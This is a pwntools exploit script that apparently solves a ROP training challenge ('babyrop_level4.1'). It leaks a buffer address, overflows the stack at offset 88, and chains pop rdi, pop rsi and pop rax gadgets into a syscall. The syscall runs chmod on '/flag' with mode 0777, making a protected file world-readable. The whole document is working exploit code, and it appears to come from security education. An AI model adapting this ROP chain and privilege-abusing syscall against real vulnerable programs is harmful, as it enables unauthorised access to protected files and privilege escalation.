from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = '/challenge/babyrop_level4.1'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

p = start()

flag = b'/flag\x00'
offset = 88

log.info(offset)

p.recvuntil(b'is located at: ')
leak = int(p.recv().split(b'.')[0],16)
log.info(f'leak buffer {hex(leak)}')

rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]   # Gadget: pop rdi; ret
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]   # Gadget: pop rsi; ret
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]   # Gadget: pop rax; ret
syscall = rop.find_gadget(['syscall', 'ret'])[0]   # Gadget: syscall

payload = flag
payload += b'\x90' * 82
payload += p64(pop_rdi)
payload += p64(leak)
payload += p64(pop_rsi)
payload += p64(0x1ff)
payload += p64(pop_rax)
payload += p64(90)
#payload += ret
payload += p64(syscall)
#payload += p64(0)
#payload += ret
#payload += syscall

p.sendline(payload)

log.info("Success")

p.interactive()
